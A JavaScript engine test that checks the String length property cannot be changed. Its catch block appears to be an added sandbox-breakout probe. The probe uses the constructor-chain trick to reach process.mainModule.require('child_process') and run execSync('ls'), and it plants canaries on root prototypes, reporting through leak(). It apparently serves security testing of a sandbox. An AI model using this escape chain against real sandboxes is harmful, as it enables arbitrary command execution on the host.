try {
    var __str__instance = new String('globglob');
    if (!__str__instance.hasOwnProperty('length')) {
        $ERROR('#1: var __str__instance = new String("globglob"); __str__instance.hasOwnProperty("length") return true. Actual: ' + __str__instance.hasOwnProperty('length'));
    }
    if (__str__instance.length !== 8) {
        $ERROR('#2: var __str__instance = new String("globglob"); __str__instance.length === 8. Actual: __str__instance.length ===' + __str__instance.length);
    }
    __str__instance.length = -1;
    if (__str__instance.length !== 8) {
        $ERROR('#3: var __str__instance = new String("globglob"); __str__instance.length=-1; __str__instance.length === 8(after redefine length property). Actual: __str__instance.length ===' + __str__instance.length);
    }
    with (__str__instance)
        length = 0;
    if (__str__instance.length !== 8) {
        $ERROR('#4: var __str__instance = new String("globglob"); with(__str__instance) length = 0; __str__instance.length === 8(after redefine length property with using "with"). Actual: __str__instance.length ===' + __str__instance.length);
    }
    __str__instance.length++;
    if (__str__instance.length !== 8) {
        $ERROR('#5: var __str__instance = new String("globglob"); __str__instance.length++; __str__instance.length === 8(after redefine length property with using "++"). Actual: __str__instance.length ===' + __str__instance.length);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}